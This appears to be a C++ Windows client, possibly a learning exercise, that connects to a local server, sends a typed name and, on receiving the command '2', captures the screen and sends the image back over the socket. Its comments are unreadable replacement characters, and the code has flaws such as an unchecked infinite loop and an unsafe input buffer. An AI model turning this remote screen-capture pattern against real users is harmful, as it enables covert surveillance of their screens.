#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <wtsapi32.h>
#include <windows.h>
#include <string>

#include <QApplication>
#include <QScreen>
#include <QPixmap>

#pragma comment(lib, "ws2_32.lib")

int main(int argc, char* argv[]) {
    char user_name[4096];
    std::cout << "Enter your name: " << std::endl;
    std::cin >> user_name;

    // ������������� ���������� Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Error while initializing Winsock" << std::endl;
        return 1;
    }

    // �������� ������
    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Error while creating a socket" << std::endl;
        WSACleanup();
        return 1;
    }

    // ��������� ������ �������
    sockaddr_in serverAddress;
    serverAddress.sin_family = AF_INET;
    inet_pton(AF_INET, "127.0.0.1", &(serverAddress.sin_addr)); // IP-����� �������
    serverAddress.sin_port = htons(8080); // ���� �������

    // ����������� � �������
    if (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        std::cerr << "Error while connecting to server" << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }

    // �������� ��������� �������
    const char* message = user_name;

    send(clientSocket, message, strlen(message), 0);

    // ��������� ������ �� �������
    while (true) {
        char buffer[4096];
        memset(buffer, 0, sizeof(buffer));
        int bytesRead = recv(clientSocket, buffer, sizeof(buffer), 0);

        if (buffer[0] == '2') {
            QApplication app(argc, argv);
            // �������� ������ ������� ������������
            QList<QScreen*> screens = QGuiApplication::screens();

            // ������� ������ QPixmap ��� �������� ���������
            QPixmap screenshot;

            // ���������� ��� ������ � ���� ������� ��������
            for (QScreen* screen : screens) {
                screenshot = screen->grabWindow(0);
            }

            // ��������� �������� � ����
            screenshot.save("screenshot.png");

            // ���������� �������� �� ������
            FILE* file = fopen("screenshot.png", "rb");
            if (file == nullptr) {
                closesocket(clientSocket);
                WSACleanup();
                return -1;
            }

            char buffer[1024];
            int bytesRead;
            while ((bytesRead = fread(buffer, 1, sizeof(buffer), file)) > 0) {
                send(clientSocket, buffer, bytesRead, 0);
            }

            fclose(file);
        }
    }

    // �������� ������ �������
    closesocket(clientSocket);

    // ������������ �������� Winsock
    WSACleanup();

    return 0;
}